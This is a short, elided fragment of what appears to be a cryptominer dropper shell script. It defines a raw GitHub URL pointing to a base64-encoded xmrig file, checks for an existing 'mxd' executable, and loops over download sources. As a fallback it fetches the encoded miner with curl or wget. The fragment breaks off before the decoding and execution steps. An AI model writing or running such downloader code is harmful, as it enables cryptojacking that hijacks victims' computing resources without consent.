...
B64='https://raw.githubusercontent.com/heinzo666/xadtwhs/main/xmrig.b64'
...
if [ ! -x mxd ]; then
  ...
  for S in $S1 $S2 $S3; do
    ...
    sz=$(wc -c < m.tgz 2>/dev/null || echo 0); [ "$sz" -gt 400000 ] && { ok=1; break; }
  done
  if [ "$ok" != "1" ]; then
    if command -v curl >/dev/null 2>&1; then b=$(curl -fsSL --max-time 220 "$B64" 2>/dev/null); else b=$(wget -qO- -T210 "$B64" 2>/dev/null); fi
